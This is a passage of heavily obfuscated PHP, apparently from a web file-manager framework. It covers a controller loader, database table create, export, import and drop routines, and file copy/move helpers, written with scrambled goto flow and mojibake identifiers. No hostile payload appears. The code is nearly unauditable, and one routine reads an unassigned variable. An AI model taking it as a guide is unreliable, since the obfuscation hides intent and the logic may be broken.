aÛÉù‰²²; f˜ÍæÊ›‘‚: $Cï°À˜‡¦í = $_SERVER[Äº¡•ô™Ÿ][1506]; $fÛÇÕŸŞ°• = file_sub_str($EÀØŸé‚¢ó, 0, 2); if ($Cï°À˜‡¦í != $fÛÇÕŸŞ°•) { return; } goto EÉØç¦’æĞ; EÉØç¦’æĞ: ob_start(); readgzfile($EÀØŸé‚¢ó); $eÖÎÆÄĞç¹ = ob_get_clean(); goto D‚ÚÛ‹¶½Î; aÛÉù‰²²: } } goto Bí…‘âõ¥Ÿ; CÜ©²òÜ™š: function Action($bâêÛ£¸¾ = '') { goto d…ÎÏà î; BÚ·¹Úšçò: $A‡ÂØÚ¼‘¶ = strtolower($AÕØ–»¯©Ï); if (isset($e»¡ôù°öÇ[$A‡ÂØÚ¼‘¶])) { return $e»¡ôù°öÇ[$A‡ÂØÚ¼‘¶]; } if (is_file($e®È±Å‚Æ°)) { include_once $e®È±Å‚Æ°; } goto FÌ³¢İ‹ò; FÌ³¢İ‹ò: if (!class_exists($AÕØ–»¯©Ï)) { return actionCallError("\x5b{$bâêÛ£¸¾}\40\75\76\40{$AÕØ–»¯©Ï}\135\x20\143\154\141\x73\163\x20\156\x6f\164\40\x65\x78\x69\x73\164\163\x21"); } $e»¡ôù°öÇ[$A‡ÂØÚ¼‘¶] = new $AÕØ–»¯©Ï(); return $e»¡ôù°öÇ[$A‡ÂØÚ¼‘¶]; goto cëåÁÈ¹Íã; cã…½µô×: $C¢ÎÓåÎ­¸ = explode($D‰½½¶ÇÓï[5], $bâêÛ£¸¾); $a«§É·¶æÖ = strtolower($C¢ÎÓåÎ­¸[0]); if (substr($a«§É·¶æÖ, -6) == $D‰½½¶ÇÓï[6]) { $bâêÛ£¸¾ = substr($C¢ÎÓåÎ­¸[0], 0, -6); $AÕØ–»¯©Ï = $bâêÛ£¸¾ . $D‰½½¶ÇÓï[7]; $e®È±Å‚Æ° = $D‰½½¶ÇÓï[8]; if (isset($C¢ÎÓåÎ­¸[1]) && substr(strtolower($C¢ÎÓåÎ­¸[1]), -5) == $D‰½½¶ÇÓï[9]) { $AÕØ–»¯©Ï = $bâêÛ£¸¾ . $C¢ÎÓåÎ­¸[1]; $e®È±Å‚Æ° = $D‰½½¶ÇÓï[10] . $C¢ÎÓåÎ­¸[1] . $D‰½½¶ÇÓï[11]; } else { if (count($C¢ÎÓåÎ­¸) == 3) { $AÕØ–»¯©Ï = $bâêÛ£¸¾ . $C¢ÎÓåÎ­¸[1] . $C¢ÎÓåÎ­¸[2]; $e®È±Å‚Æ° = $D‰½½¶ÇÓï[12] . $C¢ÎÓåÎ­¸[1] . $D‰½½¶ÇÓï[13] . $C¢ÎÓåÎ­¸[2] . $D‰½½¶ÇÓï[11]; } } $e®È±Å‚Æ° = PLUGIN_DIR . $bâêÛ£¸¾ . $D‰½½¶ÇÓï[4] . $e®È±Å‚Æ°; } else { if (substr($a«§É·¶æÖ, -5) == $D‰½½¶ÇÓï[9]) { $bâêÛ£¸¾ = substr($C¢ÎÓåÎ­¸[0], 0, -5); return Model($bâêÛ£¸¾); } else { $AÕØ–»¯©Ï = $C¢ÎÓåÎ­¸[0] . $C¢ÎÓåÎ­¸[1]; $e®È±Å‚Æ° = CONTROLLER_DIR . $C¢ÎÓåÎ­¸[0] . $D‰½½¶ÇÓï[4] . $C¢ÎÓåÎ­¸[1] . $D‰½½¶ÇÓï[14]; } } goto BÚ·¹Úšçò; d…ÎÏà î: $D‰½½¶ÇÓï =& $_SERVER[•Éº±‡£‰èä]; static $e»¡ôù°öÇ = array(); $bâêÛ£¸¾ = trim(str_replace($D‰½½¶ÇÓï[4], $D‰½½¶ÇÓï[5], $bâêÛ£¸¾), $D‰½½¶ÇÓï[4]); goto cã…½µô×; cëåÁÈ¹Íã: } function ActionApply($dšªƒİŸ‡, $e¸øÔÀ˜ö¿ = array()) { goto CµŞ³éÓ¿Ù; CµŞ³éÓ¿Ù: if (is_array($dšªƒİŸ‡)) { return call_user_func_array($dšªƒİŸ‡, $e¸øÔÀ˜ö¿); } if (function_exists($dšªƒİŸ‡)) { return call_user_func_array($dšªƒİŸ‡, $e¸øÔÀ˜ö¿); } $fÚ’¬ …™ = strrpos($dšªƒİŸ‡, $_SERVER[•Éº±‡£‰èä][5]); goto f˜œƒÖÅò; f˜œƒÖÅò: $E…±Š¾Øß¿ = substr($dšªƒİŸ‡, 0, $fÚ’¬ …™); $Bö™·ÀÎ£ñ = substr($dšªƒİŸ‡, $fÚ’¬ …™ + 1); $A®İÛ‘©É = Action($E…±Š¾Øß¿); goto cÒ›ìàå§§; cÒ›ìàå§§: if (!method_exists($A®İÛ‘©É, $Bö™·ÀÎ£ñ)) { return actionCallError("{$dšªƒİŸ‡}\x20\x6d\x65\164\x68\157\144\40\x6e\x6f\164\x20\x65\x78\x69\163\x74\163\41"); } $CÙ½ª„·Åö = call_user_func_array(array($A®İÛ‘©É, $Bö™·ÀÎ£ñ), $e¸øÔÀ˜ö¿); return $CÙ½ª„·Åö; goto a–¥Ú¹–“À; a–¥Ú¹–“À: } function actionCallError($c•ßƒõÍÇ) { $c‡ÀœÇÆÔ³ =& $_SERVER[•Éº±‡£‰èä]; $bóåùŠ¸Àï = json_encode_force(array($c‡ÀœÇÆÔ³[15] => this_url(), $c‡ÀœÇÆÔ³[16] => $GLOBALS[$c‡ÀœÇÆÔ³[16]])); $bóåùŠ¸Àï = str_replace(array($c‡ÀœÇÆÔ³[17]), array($c‡ÀœÇÆÔ³[4]), $bóåùŠ¸Àï); return write_log($c•ßƒõÍÇ . $c‡ÀœÇÆÔ³[18] . $bóåùŠ¸Àï, $c‡ÀœÇÆÔ³[19]); } goto e¹—”ÈÄ; Fç­†‰ÔÃ: define($_SERVER[Äº¡•ô™Ÿ][1910], 4); define($_SERVER[Äº¡•ô™Ÿ][1911], 5); define($_SERVER[Äº¡•ô™Ÿ][1912], 16); goto CÃ©‘…¯ãô; AÍ¹¢Şæ: class DbManage { function __construct($D£ãè§Âí, $f¬„…‡¥æá = '') { $this->database = $D£ãè§Âí; $this->type = $f¬„…‡¥æá; } public function model($aÃˆÈ”‰°¸ = '') { return new ModelBase($aÃˆÈ”‰°¸, $_SERVER[Äº¡•ô™Ÿ][33], $this->database); } public function db($Bç§ÎÖ±‡è = false) { goto f‰¨¡ùÕØî; aëê²Ñ¹ÑØ: $this->database = $A¯Øè´ÖÜ¶; $EÉØ£ÏŒ->execute("\165\163\x65\40\x60{$AÔäíäù„}\140"); return $EÉØ£ÏŒ; goto F±¨Á…¿ĞÃ; CŠËñ‡ì“: $AÔäíäù„ = $A¯Øè´ÖÜ¶[$d¹ßóˆª©[231]]; $A¯Øè´ÖÜ¶[$d¹ßóˆª©[231]] = $d¹ßóˆª©[33]; if ($A¯Øè´ÖÜ¶[$d¹ßóˆª©[890]] == $d¹ßóˆª©[727]) { $eÂø¦œÄë = $A¯Øè´ÖÜ¶[$d¹ßóˆª©[889]]; $A¯Øè´ÖÜ¶[$d¹ßóˆª©[889]] = substr($eÂø¦œÄë, 0, strrpos($eÂø¦œÄë, $d¹ßóˆª©[975])); } goto fÖº„ïÛ£ô; f‰¨¡ùÕØî: $d¹ßóˆª© =& $_SERVER[Äº¡•ô™Ÿ]; $A¯Øè´ÖÜ¶ = $this->database; if ($this->type == $d¹ßóˆª©[9] || !$Bç§ÎÖ±‡è) { return $this->model()->db(); } goto CŠËñ‡ì“; eŒ Ò«„óÏ: if (!$cÚ®½÷­ùÉ) { $EÉØ£ÏŒ->execute("\x63\162\x65\141\164\145\x20\x64\141\x74\141\x62\x61\163\145\x20\x60{$AÔäíäù„}\x60"); } $A¯Øè´ÖÜ¶[$d¹ßóˆª©[231]] = $AÔäíäù„; if ($A¯Øè´ÖÜ¶[$d¹ßóˆª©[890]] == $d¹ßóˆª©[727]) { $A¯Øè´ÖÜ¶[$d¹ßóˆª©[889]] .= $d¹ßóˆª©[975] . $AÔäíäù„; } goto aëê²Ñ¹ÑØ; fÖº„ïÛ£ô: $this->database = $A¯Øè´ÖÜ¶; $EÉØ£ÏŒ = $this->model()->db(); $cÚ®½÷­ùÉ = $EÉØ£ÏŒ->execute("\x73\150\157\x77\x20\144\x61\x74\141\x62\141\163\145\x73\x20\x6c\151\153\x65\40\x27{$AÔäíäù„}\x27"); goto eŒ Ò«„óÏ; F±¨Á…¿ĞÃ: } public function createTable($Ağ²¿¬¦Ğ, $dÙÀ‚öˆÈÓ = null) { $e–Ÿ…ğ»¸ =& $_SERVER[Äº¡•ô™Ÿ]; if (!IO::exist($Ağ²¿¬¦Ğ)) { show_json(LNG($e–Ÿ…ğ»¸[976]), !1); } $EËç…„ = sqlSplit(IO::getContent($Ağ²¿¬¦Ğ)); foreach ($EËç…„ as $Fì¥ªï°‡) { if ($dÙÀ‚öˆÈÓ) { $a»­ÍŸéõ¢ = stripos($Fì¥ªï°‡, $e–Ÿ…ğ»¸[977]) === 0; if ($a»­ÍŸéõ¢) { $dÙÀ‚öˆÈÓ->task[$e–Ÿ…ğ»¸[978]] += 1; } } $this->model()->db()->execute($Fì¥ªï°‡); if ($dÙÀ‚öˆÈÓ && $a»­ÍŸéõ¢) { $A¶ùãĞÈÆ· = $e–Ÿ…ğ»¸[979]; preg_match($A¶ùãĞÈÆ·, $Fì¥ªï°‡, $aà—õàØå); $dÙÀ‚öˆÈÓ->task[$e–Ÿ…ğ»¸[980]] = trim($eÔå–©Å­¼[0], $e–Ÿ…ğ»¸[826]); $dÙÀ‚öˆÈÓ->update(1); } } $this->taskToCache($dÙÀ‚öˆÈÓ); } public function insertTable($cä¤‚ï‘¶õ, $Dó·ëÇœ©´ = null) { $f’– œ¥¨ =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($cä¤‚ï‘¶õ as $Bƒ¥°“Øô•) { $cËÌåÄ’å = basename($Bƒ¥°“Øô•); $cËÌåÄ’å = substr($cËÌåÄ’å, 0, strrpos($cËÌåÄ’å, $f’– œ¥¨[93])); if ($Dó·ëÇœ©´) { $Dó·ëÇœ©´->task[$f’– œ¥¨[980]] = $cËÌåÄ’å; } if (get_filesize($Bƒ¥°“Øô•) == 0) { continue; } $AÌöÁÚ¤ñ¥ = $this->sqlToDb($Bƒ¥°“Øô•, $Dó·ëÇœ©´); if (!$AÌöÁÚ¤ñ¥) { show_json(LNG($f’– œ¥¨[981]) . "\x5b{$cËÌåÄ’å}\x5d", !1); } } $this->taskToCache($Dó·ëÇœ©´); } public function sqlFromDb($AŸˆÂ–ùÊ‡, $eá»ğÌï„¡, $FóÍíÏ•¶ê = null, $f¤æ¹Ùğâ = null) { goto f‰‚Ïğ³ºÉ; FŸö¬„ÜÉ§: $EÈ½¹¸ˆç“ = 1; $dÕêª¥ˆÂÉ = 500; $eíÍİ‰ğ” = fopen($eá»ğÌï„¡, $_SERVER[Äº¡•ô™Ÿ][982]); goto e¬Úõ›ÂÁ‘; aÚÅ‘Ã¾®: fclose($eíÍİ‰ğ”); return $Bë ‹µÖÓ‡; goto Cæ×„˜ˆô; e¬Úõ›ÂÁ‘: $B™Şç²´ƒÈ = $D˜í‹ƒæ·´->getPk(); $d§ãÆÉ²® = $D˜í‹ƒæ·´->getDbFields(); do { $càïã»Â© = $D˜í‹ƒæ·´->field($d§ãÆÉ²®)->order($B™Şç²´ƒÈ . $_SERVER[Äº¡•ô™Ÿ][983])->selectPage($dÕêª¥ˆÂÉ, $EÈ½¹¸ˆç“); $açñ‡Œ¯À = !empty($càïã»Â©[$_SERVER[Äº¡•ô™Ÿ][351]]) ? $càïã»Â©[$_SERVER[Äº¡•ô™Ÿ][351]] : array(); if (!($f —Ã‚«© = count($açñ‡Œ¯À))) { break; } if ($FóÍíÏ•¶ê) { $FóÍíÏ•¶ê->task[$_SERVER[Äº¡•ô™Ÿ][978]] += $f —Ã‚«©; } $f˜ÌŒÅä÷á = array(); foreach ($açñ‡Œ¯À as $bñïø±âÊ) { if ($f¤æ¹Ùğâ) { $bñïø±âÊ[$_SERVER[Äº¡•ô™Ÿ][75]] = "\173\x69\157\72{$f¤æ¹Ùğâ}\x7d" . substr($bñïø±âÊ[$_SERVER[Äº¡•ô™Ÿ][75]], strlen("\x7b\x69\x6f\x3a{$bñïø±âÊ[$_SERVER[Äº¡•ô™Ÿ][746]]}\175")); $bñïø±âÊ[$_SERVER[Äº¡•ô™Ÿ][746]] = $f¤æ¹Ùğâ; } $f˜ÌŒÅä÷á[] = $_SERVER[Äº¡•ô™Ÿ][984] . $this->sqlEncode($bñïø±âÊ) . $_SERVER[Äº¡•ô™Ÿ][985]; } $EÏßïŒù° = "\111\x4e\x53\x45\122\124\x20\x49\x4e\124\117\40\x60{$AŸˆÂ–ùÊ‡}\140\x20\50\x60" . implode($_SERVER[Äº¡•ô™Ÿ][986], $d§ãÆÉ²®) . $_SERVER[Äº¡•ô™Ÿ][987]; fwrite($eíÍİ‰ğ”, $EÏßïŒù° . implode($_SERVER[Äº¡•ô™Ÿ][988], $f˜ÌŒÅä÷á) . $_SERVER[Äº¡•ô™Ÿ][67] . PHP_EOL); $EÈ½¹¸ˆç“++; $Bë ‹µÖÓ‡ += $f —Ã‚«©; if ($FóÍíÏ•¶ê) { $FóÍíÏ•¶ê->update($f —Ã‚«©); } } while ($f —Ã‚«© == $dÕêª¥ˆÂÉ); goto aÚÅ‘Ã¾®; f‰‚Ïğ³ºÉ: if ($FóÍíÏ•¶ê) { $FóÍíÏ•¶ê->task[$_SERVER[Äº¡•ô™Ÿ][980]] = $AŸˆÂ–ùÊ‡; } $D˜í‹ƒæ·´ = $this->model($AŸˆÂ–ùÊ‡); $Bë ‹µÖÓ‡ = 0; goto FŸö¬„ÜÉ§; Cæ×„˜ˆô: } public function sqlToDb($F±„ì‹÷“°, $fºÊ¦ì’è¶ = null) { goto eÑ›¦¢ƒÀ§; eÑ›¦¢ƒÀ§: $fÈáÉ³‚—â =& $_SERVER[Äº¡•ô™Ÿ]; $B¡Œ¹–ìØË = $this->model()->db(); $EÚ¥„Õ’¹† = @fopen($F±„ì‹÷“°, $fÈáÉ³‚—â[989]); goto D¨¢óñãñë; aä¹ôôÒ¿­: if ($d´¨ÂËØ¿) { $d´¨ÂËØ¿ = rtrim(trim($d´¨ÂËØ¿), $fÈáÉ³‚—â[67]); if (!$B¡Œ¹–ìØË->execute($d´¨ÂËØ¿)) { return !1; } if ($fºÊ¦ì’è¶) { $fºÊ¦ì’è¶->update($aÉî¤ëóĞ - 1); } } return !0; goto Cºˆãøø¬ô; D„’Üßë³: $d©Œ‚ÌÓ¥Ù = 500 + 1; while (!feof($EÚ¥„Õ’¹†)) { if ($fºÊ¦ì’è¶ && $aÉî¤ëóĞ != 0) { $fºÊ¦ì’è¶->task[$fÈáÉ³‚—â[978]] += 1; } $aÉî¤ëóĞ++; $Dœªˆä—Ş = trim(fgets($EÚ¥„Õ’¹†)); $d´¨ÂËØ¿ .= $fÈáÉ³‚—â[50] . $this->sqlDecode($Dœªˆä—Ş, $this->type); if ($aÉî¤ëóĞ == $d©Œ‚ÌÓ¥Ù) { $d´¨ÂËØ¿ = rtrim(trim($d´¨ÂËØ¿), $fÈáÉ³‚—â[67]); if (!$B¡Œ¹–ìØË->execute($d´¨ÂËØ¿)) { return !1; } if ($fºÊ¦ì’è¶) { $fºÊ¦ì’è¶->update($aÉî¤ëóĞ - 1); } $d´¨ÂËØ¿ = $fÈáÉ³‚—â[33]; $aÉî¤ëóĞ = 0; } } fclose($EÚ¥„Õ’¹†); goto aä¹ôôÒ¿­; D¨¢óñãñë: if (!$EÚ¥„Õ’¹†) { return !1; } $aÉî¤ëóĞ = 0; $d´¨ÂËØ¿ = $fÈáÉ³‚—â[33]; goto D„’Üßë³; Cºˆãøø¬ô: } public function dropTable($aİè¸ ãâÎ = null) { $déäã‡‡ù¡ = $this->model()->db(); $f¥±§·®¢ƒ = $aİè¸ ãâÎ ? array($aİè¸ ãâÎ) : $déäã‡‡ù¡->getTables(); if (!$f¥±§·®¢ƒ) { return; } foreach ($f¥±§·®¢ƒ as $aİè¸ ãâÎ) { $déäã‡‡ù¡->execute("\x64\x72\x6f\x70\x20\x74\141\142\154\145\x20\151\x66\40\145\x78\x69\x73\x74\x73\40\140{$aİè¸ ãâÎ}\x60"); } } private function taskToCache($A¼ĞÀì½ßÛ = null) { $få’‚ƒÎİÊ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$A¼ĞÀì½ßÛ) { return; } $d¬ŞÏ«« = array($få’‚ƒÎİÊ[980] => $A¼ĞÀì½ßÛ->task[$få’‚ƒÎİÊ[980]], $få’‚ƒÎİÊ[978] => $A¼ĞÀì½ßÛ->task[$få’‚ƒÎİÊ[978]], $få’‚ƒÎİÊ[990] => $A¼ĞÀì½ßÛ->task[$få’‚ƒÎİÊ[990]]); if ($d¬ŞÏ««[$få’‚ƒÎİÊ[978]] == $d¬ŞÏ««[$få’‚ƒÎİÊ[990]]) { $d¬ŞÏ««[$få’‚ƒÎİÊ[699]] = 1; } Cache::set($få’‚ƒÎİÊ[991] . $A¼ĞÀì½ßÛ->task[$få’‚ƒÎİÊ[364]], $d¬ŞÏ««); $A¼ĞÀì½ßÛ->end(); } private function sqlEncode($fÜ†–âîÆÀ) { $D‡…œ«ÎĞ =& $_SERVER[Äº¡•ô™Ÿ]; $eğäô£‡àå = array(); foreach ($fÜ†–âîÆÀ as $dêˆ†—ï¥Â) { if (is_array($dêˆ†—ï¥Â)) { $dêˆ†—ï¥Â = json_encode_force($dêˆ†—ï¥Â); } $dêˆ†—ï¥Â = addslashes($dêˆ†—ï¥Â); $dêˆ†—ï¥Â = str_replace(array($D‡…œ«ÎĞ[992], $D‡…œ«ÎĞ[214]), array($D‡…œ«ÎĞ[993], $D‡…œ«ÎĞ[994]), $dêˆ†—ï¥Â); $eğäô£‡àå[] = str_replace($D‡…œ«ÎĞ[55], $D‡…œ«ÎĞ[995], $dêˆ†—ï¥Â); } return $D‡…œ«ÎĞ[55] . implode($D‡…œ«ÎĞ[996], $eğäô£‡àå) . $D‡…œ«ÎĞ[55]; } private function sqlDecode($a‰–òòˆÂª, $aìŞÖ´¾ç) { $A‰’¸ïè® =& $_SERVER[Äº¡•ô™Ÿ]; $a‰–òòˆÂª = str_replace(array($A‰’¸ïè®[993], $A‰’¸ïè®[994]), array($A‰’¸ïè®[992], $A‰’¸ïè®[214]), $a‰–òòˆÂª); if ($aìŞÖ´¾ç == $A‰’¸ïè®[9]) { $a‰–òòˆÂª = stripslashes($a‰–òòˆÂª); } return $a‰–òòˆÂª; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($c¶ôªö–é¬, $Fœ…ˆ¹²ÜÜ) { $F¥Å®–½¹ = self::driverMake($Fœ…ˆ¹²ÜÜ[0]); if (method_exists($F¥Å®–½¹, $c¶ôªö–é¬)) { return @call_user_func_array(array($F¥Å®–½¹, $c¶ôªö–é¬), $Fœ…ˆ¹²ÜÜ); } if (method_exists($F¥Å®–½¹, $_SERVER[Äº¡•ô™Ÿ][997])) { return @call_user_func_array(array($F¥Å®–½¹, $c¶ôªö–é¬), $Fœ…ˆ¹²ÜÜ); } else { if (method_exists(self, $c¶ôªö–é¬)) { return @call_user_func_array(array(self, $c¶ôªö–é¬), $Fœ…ˆ¹²ÜÜ); } else { call_user_func_array(array(parent, $c¶ôªö–é¬), $Fœ…ˆ¹²ÜÜ); } } } public static function init($cŞ…¯“Şœ¦) { return self::driverMake($cŞ…¯“Şœ¦); } public static function copy($Fˆñé’¦Ï, $b´Ì÷±ˆÙï, $B„Š´šŸÖÇ = false, $E©ÊÜÁÂ—ã = false) { return self::copyMove($Fˆñé’¦Ï, $b´Ì÷±ˆÙï, $B„Š´šŸÖÇ, $_SERVER[Äº¡•ô™Ÿ][486], $E©ÊÜÁÂ—ã); } public static function move($A«ñ‰ÌÆæò, $CâœÕˆ„­, $e·‰¹ˆ×¼ƒ = false, $b‡Å¢¶Ï†Â = false) { return self::copyMove($A«ñ‰ÌÆæò, $CâœÕˆ„­, $e·‰¹ˆ×¼ƒ, $_SERVER[Äº¡•ô™Ÿ][488], $b‡Å¢¶Ï†Â); } public static function saveFile($C„ºÒÆÈÛ, $Eš›º«ìá, $B†Ş®ê ‘ = true) { goto aâà—¹Ñéò; aâà—¹Ñéò: $FŠÕÕÕ¼óÉ =& $_SERVER[Äº¡•ô™Ÿ]; $bƒÔšÔö§º = self::info($Eš›º«ìá); $Dã‰­œÔ—õ = self::driverMake($C„ºÒÆÈÛ); goto Dãù±àÚ¸å; f…©îÂÏ“: $cóÈùäİç© = $A¬ñÀ¬…™->pathFather($Eš›º«ìá); $e±Ñ…ó‚â = !0; if (!$B†Ş®ê ‘ && self::driverIsSame($Dã‰­œÔ—õ, $A¬ñÀ¬…™)) { $e±Ñ…ó‚â = !1; } goto cÓ¼…Ïç–Š; cÓ¼…Ïç–Š: $CÃÑ¥•¤½Ç = self::copyFile($Dã‰­œÔ—õ, $C„ºÒÆÈÛ, $A¬ñÀ¬…™, $cóÈùäİç©, $bƒÔšÔö§º[$FŠÕÕÕ¼óÉ[28]], $e±Ñ…ó‚â); if ($B¾‡Ñâºµ¡) { $CÃÑ¥•¤½Ç = $B¾‡Ñâºµ¡->getPathOuter($CÃÑ¥•¤½Ç); } return $CÃÑ¥•¤½Ç; goto c‰†ÎÅñÌ‡; Dãù±àÚ¸å: $A¬ñÀ¬…™ = self::driverMake($Eš›º«ìá); $B¾‡Ñâºµ¡ = !1; if ($A¬ñÀ¬…™->pathParse[$FŠÕÕÕ¼óÉ[998]]) { $b–ŞŸ¿Ğç = $A¬ñÀ¬…™->pathParse[$FŠÕÕÕ¼óÉ[998]]; $B¾‡Ñâºµ¡ = $A¬ñÀ¬…™; $A¬ñÀ¬…™ = self::driverMake($b–ŞŸ¿Ğç); } goto f…©îÂÏ“; c‰†ÎÅñÌ‡: } private static function copyMove($A„†ÙªèŞ, $Fêé÷±›“, $c¦±‰õĞ—®, $eˆ¥¥¶ôÜ, $E­ƒ‘ñ¦Ï = false) { goto Eô‚õßßÏ‡; B¿ªóˆ»›„: $dó¹¡‹çìÑ = $FçóÌ½„ä©->isFile($A„†ÙªèŞ); if (!$dó¹¡‹çìÑ && $E»«›ò¶İè->getType() == $bêá®áÚ’ğ[697] && $FçóÌ½„ä©->getType() == $bêá®áÚ’ğ[103]) { $bó¯»ÜÍŠ = $E»«›ò¶İè->copyFolderFromIO($FçóÌ½„ä©, $A„†ÙªèŞ, $Fêé÷±›“, $c¦±‰õĞ—®, $BÂâ–Šš¶ç, $E­ƒ‘ñ¦Ï); } else { $bó¯»ÜÍŠ = self::copyPath($FçóÌ½„ä©, $A„†ÙªèŞ, $E»«›ò¶İè, $Fêé÷±›“, $c¦±‰õĞ—®, $BÂâ–Šš¶ç, $dó¹¡‹çìÑ, $E­ƒ‘ñ¦Ï); } if ($bó¯»ÜÍŠ && $BÂâ–Šš¶ç) { $FçóÌ½„ä©->remove($A„†ÙªèŞ); } goto eì¦±¨ÛÄŒ; d¬ÈªÚ„ë: Hook::trigger($bêá®áÚ’ğ[72], $FçóÌ½„ä©, $A„†ÙªèŞ, $E»«›ò¶İè, $Fêé÷±›“); $D½´æèÑ±¥ = self::driverIsSame($FçóÌ½„ä©, $E»«›ò¶İè); if ($D½´æèÑ±¥) { if ($eˆ¥¥¶ôÜ == $bêá®áÚ’ğ[488] && trim($Fêé÷±›“, $bêá®áÚ’ğ[8]) == trim($E»«›ò¶İè->pathFather($A„†ÙªèŞ), $bêá®áÚ’ğ[8])) { return $E»«›ò¶İè->getPathOuter($A„†ÙªèŞ); } if (method_exists($E»«›ò¶İè, $eˆ¥¥¶ôÜ)) { return $E»«›ò¶İè->{$eˆ¥¥¶ôÜ}($A„†ÙªèŞ, $Fêé÷±›“, $c¦±‰õĞ—®); } } goto B¿ªóˆ»›„; f¬Á­Ü±: $FçóÌ½„ä© = self::driverMake($A„†ÙªèŞ); $E»«›ò¶İè = self::driverMake($Fêé÷±›“); $BÂâ–Šš¶ç = $eˆ¥¥¶ôÜ == $bêá®áÚ’ğ[488]; goto B•²Ùõßî; Eô‚õßßÏ‡: $bêá®áÚ’ğ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$A„†ÙªèŞ || $A„†ÙªèŞ == $bêá®áÚ’ğ[8] || !$Fêé÷±›“) { return !1; } ignore_timeout(); goto f¬Á­Ü±; B•²Ùõßî: $B‰¹á¹©ÉÀ = !1; if ($E»«›ò¶İè->pathParse[$bêá®áÚ’ğ[998]]) { $Fêé÷±›“ = $E»«›ò¶İè->pathParse[$bêá®áÚ’ğ[998]]; $B‰¹á¹©ÉÀ = $E»«›ò¶İè; $E»«›ò¶İè = self::driverMake($Fêé÷±›“); } self::check($FçóÌ½„ä©, $A„†ÙªèŞ, $E»«›ò¶İè, $Fêé÷±›“); goto d¬ÈªÚ„ë; eì¦±¨ÛÄŒ: if ($B‰¹á¹©ÉÀ) { $bó¯»ÜÍŠ = $B‰¹á¹©ÉÀ->getPathOuter($bó¯»ÜÍŠ); } return $bó¯»ÜÍŠ; goto CØ¬ôêîğ; CØ¬ôêîğ: } private static function check($Cù«ô˜”õ¯, $c¤›í¡ÂƒÑ, $FùØ¾¨Ú”, &$eô¡‹Õİ) { $FÚ»õî×²Ó =& $_SERVER[Äº¡•ô™Ÿ]; if (self::driverIsSame($Cù«ô˜”õ¯, $FùØ¾¨Ú”) && $Cù«ô˜”õ¯->isFolder($c¤›í¡ÂƒÑ) && $Cù«ô˜”õ¯->isParentOf($c¤›í¡ÂƒÑ, $eô¡‹Õİ)) { show_json(LNG($FÚ»õî×²Ó[999]), !1); } if (!$Cù«ô˜”õ¯->exist($c¤›í¡ÂƒÑ)) { show_json(LNG($FÚ»õî×²Ó[102]), !1); } } private static function copyPath($D­Šè¡‰¦Ô, $få©‹Ú„ë, $C—¶¨°ÄÕÙ, $cĞ‡‘ùÈá, $E¨ïë×‚Ÿ, $F¨ß¹¢ª·», $cÓŞùàùºˆ, $a‚´Ú±·ƒ® = false) { goto D÷¥å ¯; D÷¥å ¯: $E¬½ºò›©Ï =& $_SERVER[Äº¡•ô™Ÿ]; $DñÆ ñ±¢ğ = $a‚´Ú±·ƒ® ? $a‚´Ú±·ƒ® : $D­Šè¡‰¦Ô->getPathName($D­Šè¡‰¦Ô->pathThis($få©‹Ú„ë)); if ($E¨ïë×‚Ÿ) { $Dè‹áÕ”½¦ = $C—¶¨°ÄÕÙ->fileNameExist($cĞ‡‘ùÈá, $DñÆ ñ±¢ğ); $DñÆ ñ±¢ğ = $C—¶¨°ÄÕÙ->fileNameAuto($cĞ‡‘ùÈá, $DñÆ ñ±¢ğ, $E¨ïë×‚Ÿ, !$cÓŞùàùºˆ); $E¨ïë×‚Ÿ = $Dè‹áÕ”½¦ ? $E¨ïë×‚Ÿ : !1; } goto aöæâ‘Ç©; aöæâ‘Ç©: if ($cÓŞùàùºˆ) { return self::copyFile($D­Šè¡‰¦Ô, $få©‹Ú„ë, $C—¶¨°ÄÕÙ, $cĞ‡‘ùÈá, $DñÆ ñ±¢ğ, $F¨ß¹¢ª·»); } if ($E¨ïë×‚Ÿ == REPEAT_RENAME_FOLDER) { $E¨ïë×‚Ÿ = !1; } $Cªóå…½¡ = rtrim($cĞ‡‘ùÈá, $E¬½ºò›©Ï[8]) . $E¬½ºò›©Ï[8] . $DñÆ ñ±¢ğ; goto D°“¶æâµ; D°“¶æâµ: $a½¹Õ‡øÂœ = $C—¶¨°ÄÕÙ->mkdir($C—¶¨°ÄÕÙ->getPath($Cªóå…½¡)); $cĞ‡‘ùÈá = $C—¶¨°ÄÕÙ->getPathInner($a½¹Õ‡øÂœ); $eƒ‚ß×Â½Æ = $D­Šè¡‰¦Ô->listPath($få©‹Ú„ë, !0); goto FÇ²ç½‰±¨; FÇ²ç½‰±¨: $dâòßÊ«„È = array_merge($eƒ‚ß×Â½Æ[$E¬½ºò›©Ï[73]], $eƒ‚ß×Â½Æ[$E¬½ºò›©Ï[74]]); foreach ($dâòßÊ«„È as $Có°ãÜ±—°) { $D•ß¯’Óî = $Có°ãÜ±—°[$E¬½ºò›©Ï[29]] == $E¬½ºò›©Ï[164]; $få©‹Ú„ë = $D­Šè¡‰¦Ô->getPathInner($Có°ãÜ±—°[$E¬½ºò›©Ï[75]]); $b™Á¸ Û“é = self::copyPath($D­Šè¡‰¦Ô, $få©‹Ú„ë, $C—¶¨°ÄÕÙ, $cĞ‡‘ùÈá, $E¨ïë×‚Ÿ, $F¨ß¹¢ª·», $D•ß¯’Óî); if (!$b™Á¸ Û“é) { write_log($E¬½ºò›©Ï[1000] . $få©‹Ú„ë . $E¬½ºò›©Ï[1001] . $cĞ‡‘ùÈá, $E¬½ºò›©Ï[1002]); } } return $a½¹Õ‡øÂœ; goto dÏ°¦Ş„; dÏ°¦Ş„: } private static function copyFile($dºöÒÜ÷’‡, $bÒÏ÷Å‹¤Ò, $D“¢˜ŒÎô§, $aÓã­¹×á—, $eï¼§Âñ¢¦, $eœÁ÷¼²„) { goto f‹õ™ã·«ò; Cˆèœ¼²í: Hook::trigger($a•‘˜†¶äÏ[1005], $dºöÒÜ÷’‡, $bÒÏ÷Å‹¤Ò, $D“¢˜ŒÎô§, $aÓã­¹×á—, $eï¼§Âñ¢¦, $AÉ¬…å©¦ê); return $AÉ¬…å©¦ê; goto bƒº…Á­ë; f‹õ™ã·«ò: $a•‘˜†¶äÏ =& $_SERVER[Äº¡•ô™Ÿ]; $aÓã­¹×á— = $D“¢˜ŒÎô§->getPath(rtrim($aÓã­¹×á—, $a•‘˜†¶äÏ[8]) . $a•‘˜†¶äÏ[8] . 